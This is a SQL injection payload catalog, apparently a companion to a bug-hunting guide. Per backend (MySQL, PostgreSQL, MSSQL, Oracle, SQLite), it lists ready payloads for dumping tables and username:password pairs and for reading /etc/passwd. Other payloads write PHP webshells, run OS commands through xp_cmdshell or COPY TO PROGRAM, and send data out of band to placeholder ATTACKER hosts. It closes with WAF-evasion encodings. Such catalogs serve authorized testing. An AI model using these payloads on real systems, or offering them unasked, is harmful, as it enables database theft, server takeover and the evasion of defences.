# SQLi — Exhaustive DBMS / exfil variant matrix

Companion to `hunt-sqli`. That file covers the *method* (UNION column-count, boolean, time)
and modern NoSQL/ORM cases; this file is the **per-backend payload catalog** + blind-exfil
ladder — the parts that decide whether a confirmed injection turns into data theft or RCE.

## 1. DBMS fingerprint (before choosing payloads)

| signal | DBMS |
|---|---|
| `'` → `You have an error in your SQL syntax... MySQL` | MySQL |
| `'` → `unterminated quoted string` / `near "'"` | SQLite |
| `'` → `syntax error at or near` / `ERROR: ` | PostgreSQL |
| `'` → `ORA-01756` / `ORA-...` | Oracle |
| `'` → `Unclosed quotation mark` | MSSQL |
| `--` vs `#` comment | MySQL/MariaDB accept `#`; others `--` |
| `SELECT version()` vs `@@version` | MySQL vs MSSQL |
| string concat | `'a'||'b'` (Oracle/Postgres/SQLite) vs `concat('a','b')` (MySQL) |

## 2. Union-based column-count (already in main), then DBMS-specific dump

### MySQL
```
' UNION SELECT 1,@@version,database(),4,5-- -
' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users-- -
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5-- -        # file read (FILE priv)
' UNION SELECT 1,'<?php system($_GET["c"]);?>',3,4,5 INTO OUTFILE '/var/www/html/s.php'-- -   # RCE (FILE + secure_file_priv='')
```

### PostgreSQL
```
' UNION SELECT NULL,current_database(),current_user,NULL,NULL-- -
' UNION SELECT NULL,string_agg(table_name,','),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public'-- -
' UNION SELECT NULL,string_agg(column_name,','),NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT NULL,pg_read_file('/etc/passwd',0,1000),NULL,NULL,NULL-- -   # needs pg_read_server_files
'; COPY (SELECT '') TO PROGRAM 'id'-- -                            # RCE (superuser/super COPY)
'; CREATE OR REPLACE FUNCTION exec() RETURNS void AS $$ BEGIN PERFORM dblink_exec(...); END $$-- -  # dblink RCE
```

### MSSQL
```
' UNION SELECT NULL,@@version,DB_NAME(),NULL,NULL-- -
' UNION SELECT NULL,STRING_AGG(name,','),NULL,NULL,NULL FROM sys.tables-- -
' UNION SELECT NULL,STRING_AGG(name,','),NULL,NULL,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')-- -
'; EXEC xp_cmdshell 'whoami'-- -                      # RCE (needs sysadmin to enable xp_cmdshell)
'; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE-- -
' UNION SELECT NULL,BULKCOLUMN,NULL,NULL,NULL FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) x-- -  # file read
```

### Oracle
```
' UNION SELECT NULL,banner,NULL,NULL,NULL FROM v$version-- -
' UNION SELECT NULL,table_name,NULL,NULL,NULL FROM all_tables WHERE ROWNUM<=10-- -
' UNION SELECT NULL,UTL_HTTP.REQUEST('http://ATTACKER/'),NULL,NULL,NULL FROM dual-- -  # SSRF via UTL_HTTP
' UNION SELECT NULL,DBMS_LDAP.INIT(('curl ATTACKER'||CHR(58)),80),NULL,NULL,NULL FROM dual-- -  # OOB
```
Oracle time-based: `AND (SELECT COUNT(*) FROM all_objects) > x` (rows-count delay), or `DBMS_LOCK.SLEEP(5)` in a PL/SQL block via error.

### SQLite
```
' UNION SELECT 1,sqlite_version(),3,4,5-- -
' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'-- -
' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='users'-- -
# file write via ATTACH:  '; ATTACH DATABASE '/var/www/html/s.php' AS x; CREATE TABLE x.p (c text); INSERT INTO x.p VALUES ('<?php system($_GET[c]);?>');-- -
```

## 3. Blind exfil ladder (when union/error don't reflect)

| rung | technique | proof |
|---|---|---|
| 1 | boolean `AND SUBSTR((SELECT PASSWORD FROM users LIMIT 1),1,1)='a'` | per-char diff |
| 2 | time `AND IF(MID(version(),1,1)='5',SLEEP(5),0)` | measured delay |
| 3 | DNS OOB — MySQL `LOAD_FILE(CONCAT('\\\\',(SELECT password),'.ATTACKER.oast\\a'))` (Windows UNC) or Oracle `UTL_INADDR.get_host_address` | DNS callback |
| 4 | HTTP OOB — MSSQL `EXEC xp_dirtree '\\ATTACKER\share'`; Postgres `COPY ... TO PROGRAM 'curl ATTACKER/?d=...'`; Oracle `UTL_HTTP.REQUEST` | HTTP callback with data |
| 5 | error-based OOB — `extractvalue(1,concat(0x7e,(SELECT...),0x7e))` (MySQL), `UPDATEXML`, `CAST(...AS xml)` (MSSQL) | data in the error string |

## 4. Second-order SQLi (the silent one)

Input stored "safely" (escaped on insert), then used UNESCAPED in a later query:
```
1. register username as:  admin'--         (no error at insert — stored literally)
2. trigger the query that reads the username back into a WHERE/UPDATE/ORDER BY
3. injection fires on the SECOND use → the cleanup/migration/search path is the sink
```
Grep for stored fields that later feed `ORDER BY`, `WHERE`, or a raw fragment.

## 5. WAF bypass — one-shot polyglot + chunking

Already in main; the two highest-yield additions:
- **Comment-char matrix:** `#`, `-- -`, `--+`, `/**/`, `/*!50000*/`, newline `%0a`, backtick.
- **Case/encoding:** `UnIoN/**/SeLeCt`, `%55NION`, utf8mb4 fullwidth, `CHAR()` builder
  (`CHAR(83,69,76,69,67,84)` = SELECT) to hide keywords entirely.
- **Chunked transfer** to split `' OR 1=1` across body chunks (WAF reassembly gap).

## 6. RCE escalation (per DBMS, when file/OS privs exist)

| DBMS | vector |
|---|---|
| MySQL | `INTO OUTFILE` webshell (needs `FILE` + `secure_file_priv=''` + writable webroot) |
| Postgres | `COPY ... FROM PROGRAM`, `pg_ls_dir`, `lo_import`, dblink, `plpython` |
| MSSQL | `xp_cmdshell` (enable via `sp_configure`), `xp_fileexist`, OLE Automation |
| Oracle | `DBMS_SCHEDULER.create_job`, Java stored procedure `OSCommand` |
| SQLite | `ATTACH DATABASE '/path/s.php'` → write webshell |

Every RCE claim needs `whoami`/`id` output or an OOB callback — the two-halves rule
from `hunt-rce` applies.